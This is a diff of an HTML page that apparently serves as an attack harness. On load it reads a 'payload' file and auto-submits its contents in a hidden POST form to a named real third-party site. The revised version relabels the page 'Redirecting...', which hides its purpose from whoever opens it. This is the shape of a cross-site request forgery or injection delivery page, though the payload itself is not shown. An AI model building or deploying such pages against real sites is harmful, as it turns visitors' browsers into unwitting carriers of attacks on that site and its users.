@@ -1,38 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>POST Request Auto-Redirect</title>
+    <title>Redirecting...</title>
 </head>
-
 <body>
-    <form id="autoPostForm" action="https://preventivi.senec.it/global/" method="POST" accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8">
-        <input type="hidden" name="step" value='1'>
-        <input type="hidden" name="address" id="addressInput">
+    <form id="redirectForm" method="POST" action="https://preventivi.senec.it/global/">
+        <input type="hidden" name="address" id="addressField">
     </form>
-
     <script>
-        // Set headers for the request
-        const headers = {
-            'Referer': 'https://preventivi.senec.it/',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Encoding': 'gzip,deflate,br',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
-        };
-
-        // Load the address from payload.txt and submit the form
-        fetch('payload2.txt')
-            .then(response => response.text())
-            .then(address => {
-                document.getElementById('addressInput').value = address;
-                document.getElementById('autoPostForm').submit();
-            })
-            .catch(error => {
-                console.error('Error loading address:', error);
-            });
+        async function submitForm() {
+            try {
+                const response = await fetch('payload2.txt');
+                const address = await response.text();
+                document.getElementById('addressField').value = address;
+                document.getElementById('redirectForm').submit();
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        document.addEventListener('DOMContentLoaded', submitForm);
     </script>
 </body>
-
 </html>
